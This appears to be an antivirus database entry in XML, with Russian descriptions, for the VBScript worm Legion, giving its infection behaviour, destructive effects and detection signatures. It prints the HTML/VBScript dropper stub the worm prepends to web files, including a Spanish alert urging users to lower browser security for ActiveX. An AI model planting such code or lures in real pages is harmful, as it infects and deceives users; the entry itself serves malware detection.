<?xml version="1.0" encoding="Windows-1251"?>
<AVX VERSION="1.1">
  <VIRUS NAME="Virus.Script.VBS.Legion._" WILD="0" COMPLETE="0" SIZE="0">
    <COMMON>
      <FAMILY>Virus.Script.VBS.Legion</FAMILY>
      <VIRUS_TYPE>SCRIPT</VIRUS_TYPE>
      <VIRUS_TYPE>DROPPER</VIRUS_TYPE>
      <VIRUS_TYPE>STEALTH</VIRUS_TYPE>
      <EXTRA_INFO />
    </COMMON>
    <INFECT>
      <EXECUTE_TYPE>VBS</EXECUTE_TYPE>
      <INFECT_FILE TYPE="">
        <METHOD />
      </INFECT_FILE>
      <OS_FAMILY>WINDOWS 9x</OS_FAMILY>
      <OS_FAMILY>WINDOWS NT</OS_FAMILY>
      <INFECT_FILE_INFO>Вирус, при условии, что значение ключа реестра HKCU\software\Legion на равно sistem = Infected, производит рекурсивный поиск файлов "htt", "htm", "html" на всех доступных дисках и заражает каждый найденный файл, записывая в его начало следующий код:
<![CDATA[			
<html> <body> <script language="vbscript">
ON ERROR RESUME NEXT
Set fsoafwwqj = CreateObject("scripting.filesystemobject")
Set Fsafwwqj= fsoafwwqj.CreateTextFile(fsoafwwqj.getspecialfolder(0) & "\Temp.vbs" , True)
Fsafwwqj.write""
Fsafwwqj.Close
Set wsafwwqj = CreateObject("wscript.shell")
wsafwwqj.run fsoafwwqj.getspecialfolder(0) & "\wscript.exe " & fsoafwwqj.getspecialfolder(0) & "\Temp.vbs %"
If err.number <> 0 Then
alert("Error." & vbCrLf & "Esta pagina requiere ActiveX para funcionar correctamente." & vbCrLf & "Presione Actualizar y acepte la ejecucion de ActiveX." & vbCrLf & "Si no se le permite aceptar ActiveX, baje el nivel de seguridad de " & vbCrLf & "su navegador, o busque como permitir esta interaccion." & vbCrLf & "")
End If
</script> </body/> </html>
]]>.
			</INFECT_FILE_INFO>
      <EFFECTS_INFO>Троян рассылает себя по почте, копирует себя в различные файлы, изменяет настройки системы, меняя значения ключей системного реестра. Выбрасывает дроппер-файлы. 2-го числа каждого месяца троян выводит на экран сообщение "La Conquista ah llegado termino el juego". Троян пытается удалить все файлы из корня диска С, директорий "Windows", "System", "Command". Изменяет содержимое "autoexec.bat".Троян ищет и удаляет антивирусное ПО различных производителей.
			
			</EFFECTS_INFO>
    </INFECT>
    <CURE />
    <RESEARCH RESEARCHER="Oleg Y. Zykov" DATE_CREATE="13.04.2006" />
    <DETECTION>
      <SIGNATURE TYPE="SCRIPT" GROUP="0" FILE="I-Worm.Legion" OFFSET="0" LEVEL="0">
        <PART NUMBER="0"><![CDATA[[PID=4];KW IF;ID "FileExists";ID {0};OP STRCAT;STR;KW THEN;ID;OP EQUAL;ID {0};OP STRCAT;STR;ID;ID "DeleteFile";ID {0};OP STRCAT;STR;]]></PART>
        <PART NUMBER="1"><![CDATA[[PID=4];ID;ID "regwrite";STR "HKCU\software\Legion";STR "sistem = Infected";]]></PART>
        <PART NUMBER="2"><![CDATA[[PID=4];KW IF;ID "day";ID "now";OP EQUAL;NUM 2;KW THEN;ID "MSGBOX";STR "La Conquista ah llegado termino el juego";NUM 16;STR "Virus Legion";]]></PART>
      </SIGNATURE>
    </DETECTION>
  </VIRUS>
</AVX>
